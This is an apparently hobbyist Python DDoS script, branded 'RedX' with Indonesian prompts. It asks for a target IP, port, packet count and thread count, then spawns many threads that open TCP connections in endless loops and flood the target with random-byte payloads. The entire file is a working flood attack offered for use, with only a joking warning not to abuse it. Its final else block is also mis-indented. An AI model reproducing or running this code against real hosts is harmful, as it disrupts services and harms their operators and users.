import random
import socket
import threading
import socket
import argparse
import sys
from time import time as tt
import os
import re
import urllib.request
import requests
import os,sys

os.system("clear")
print("\033[93m")
print('''\033[94m Tools By RedX
██████╗░███████╗██████ ╗██╗░░██╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
██████╔╝█████╗░░██║░░██║░╚███╔╝
██╔══██╗██╔══╝░░██║░░██║░██╔██╗
██║░░██║███████╗██████╔╝██╔╝╚██╗
╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝
------------------------------------------------------------
      >Jangan Abuse Ya Maniez<         
      >    Tools By RedX     <
------------------------------------------------------------
''')
ip = str(input("MASUKIN IPNYA | Target IP:"))
port = int(input("MASUKIN PORTNYA | Target Port:"))
choice = str(input("GAS GA NI? (y/n):"))
times = int(input("PACKETNYA BERAPA | Packet :"))
threads = int(input("MAU BERAPA LAMA |Threads:"))

os.system("clear")
def ddos():
	data = random._urandom(1490)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
		except:
			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")

def ddos2():
	data = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
		except:
			s.close()
			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")

def ddos3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
		except:
			s.close()
			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")


for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
        else: 
                th = threading.Thread(target = ddos3)
                th.start()
